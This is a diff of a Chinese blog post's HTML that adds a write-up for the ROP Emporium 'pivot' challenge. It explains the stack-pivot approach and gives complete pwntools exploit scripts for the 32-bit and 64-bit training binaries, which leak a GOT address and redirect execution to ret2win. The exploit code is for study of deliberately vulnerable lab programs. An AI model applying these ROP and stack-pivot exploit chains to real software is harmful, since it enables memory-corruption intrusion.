@@ -446,21 +446,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-05-29
+                    2020-05-31
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.2k
+                    2.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    10 分
+                    13 分
                 </div>
                 
 
@@ -853,7 +853,95 @@ payload <span class="token operator">+=</span> p64<span class="token punctuation
 p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
 <p><img src="/images/14/fluff/2.jpg" alt></p>
-<h2 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h2><p>待补充…</p>
+<h2 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h2><h6 id="32位-6"><a href="#32位-6" class="headerlink" title="32位:"></a><a href="https://ropemporium.com/binary/pivot32.zip" target="_blank" rel="noopener">32位</a>:</h6><p>分析一下题目, 有两个输入的地方,<br>第一次输入会输入到<code>堆</code>中, 也就是程序打印那个地址.<br>第二次输入就是要溢出了, 但是给我们构造ROP链的大小只有<code>0xb</code>. 肯定不够我们构造复杂的ROP链的, 所以我们要进行<code>栈迁移</code>.</p>
+<p>题目给了<code>libcpivot32.so</code>, 分析了一下可以看到<code>ret2win</code>函数和<code>foothold_function</code>, 可以通过泄露<code>foothold_function</code>的地址计算出<code>ret2win</code>的实际地址并执行.</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">import</span> time
+
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pivot32"</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pivot32"</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"libpivot32.so"</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true"># var</span>
+overflow <span class="token operator">=</span> <span class="token number">0x28</span> <span class="token operator">+</span> <span class="token number">4</span>                                <span class="token comment" spellcheck="true"># 溢出字节</span>
+ret2win_sym <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"ret2win"</span><span class="token punctuation">]</span>                  <span class="token comment" spellcheck="true"># 得到ret2win函数的地址</span>
+foothold_sym <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"foothold_function"</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># 得到foothold_function</span>
+offset <span class="token operator">=</span> ret2win_sym <span class="token operator">-</span> foothold_sym                <span class="token comment" spellcheck="true"># 计算出foothold到ret2win函数的偏移</span>
+foothold_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"foothold_function"</span><span class="token punctuation">]</span>
+foothold_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"foothold_function"</span><span class="token punctuation">]</span>
+
+pop_eax <span class="token operator">=</span> <span class="token number">0x080488c0</span>            <span class="token comment" spellcheck="true"># pop eax; ret</span>
+pop_ebx <span class="token operator">=</span> <span class="token number">0x08048571</span>            <span class="token comment" spellcheck="true"># pop ebx; ret</span>
+mov_eax_eax <span class="token operator">=</span> <span class="token number">0x080488c4</span>        <span class="token comment" spellcheck="true"># mov eax, [eax]; ret</span>
+add_eax_ebx <span class="token operator">=</span> <span class="token number">0x080488c7</span>        <span class="token comment" spellcheck="true"># add eax, ebx; ret</span>
+call_eax <span class="token operator">=</span> <span class="token number">0x080486a3</span>            <span class="token comment" spellcheck="true"># call eax</span>
+xchg_eax_esp <span class="token operator">=</span> <span class="token number">0x080488c2</span>        <span class="token comment" spellcheck="true"># xchg eax, esp; ret</span>
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"The Old Gods kindly bestow upon you a place to pivot: "</span><span class="token punctuation">)</span>
+
+heap <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 获得程序打印出来的heap地址 也就是我们第一次写入的内容地址.</span>
+payload <span class="token operator">=</span> b<span class="token string">""</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>foothold_plt<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>foothold_got<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>mov_eax_eax<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_ebx<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>add_eax_ebx<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>call_eax<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> b<span class="token string">"A"</span> <span class="token operator">*</span> overflow
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_eax<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>heap<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>xchg_eax_esp<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 让eax和esp两个寄存器交换内容</span>
+
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p><img src="/images/14/pivot/1.jpg" alt></p>
+<h5 id="64位-6"><a href="#64位-6" class="headerlink" title="64位:"></a><a href>64位</a>:</h5><p>和32位差不多</p>
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding:utf-8</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pivot"</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libpivot.so"</span><span class="token punctuation">)</span>
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pivot"</span><span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true"># var</span>
+foothold_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'foothold_function'</span><span class="token punctuation">]</span>
+foothold_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'foothold_function'</span><span class="token punctuation">]</span>
+foothold_sym <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'foothold_function'</span><span class="token punctuation">]</span>
+ret2win <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'ret2win'</span><span class="token punctuation">]</span>
+offset <span class="token operator">=</span> ret2win <span class="token operator">-</span> foothold_sym
+mov_rax_rax <span class="token operator">=</span> <span class="token number">0x0000000000400b05</span>
+pop_rax_ret <span class="token operator">=</span> <span class="token number">0x0000000000400b00</span>
+call_rax <span class="token operator">=</span><span class="token number">0x00000000040098e</span>
+add_rax_rbp <span class="token operator">=</span> <span class="token number">0x00000000000400b09</span>
+pop_rbp <span class="token operator">=</span> <span class="token number">0x0000000000400900</span>
+xchg_rax_rsp <span class="token operator">=</span> <span class="token number">0x0000000000400b02</span>
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"The Old Gods kindly bestow upon you a place to pivot: "</span><span class="token punctuation">)</span>
+
+heap <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
+
+payload1 <span class="token operator">=</span> p64<span class="token punctuation">(</span>foothold_plt<span class="token punctuation">)</span>
+payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span>
+payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>foothold_got<span class="token punctuation">)</span>
+payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_rax_rax<span class="token punctuation">)</span>
+payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rbp<span class="token punctuation">)</span>
+payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>
+payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>add_rax_rbp<span class="token punctuation">)</span>
+payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>call_rax<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>
+payload2 <span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">0x08</span><span class="token punctuation">)</span>
+payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span>
+payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>heap<span class="token punctuation">)</span>
+payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>xchg_rax_rsp<span class="token punctuation">)</span>     
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"into libpivot.so"</span><span class="token punctuation">)</span>
+
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
 <h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><p>待补充…</p>
 
             </div>
@@ -1385,7 +1473,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">8.2k</span>&nbsp;字
+                class="white-color">8.6k</span>&nbsp;字
             
             
 
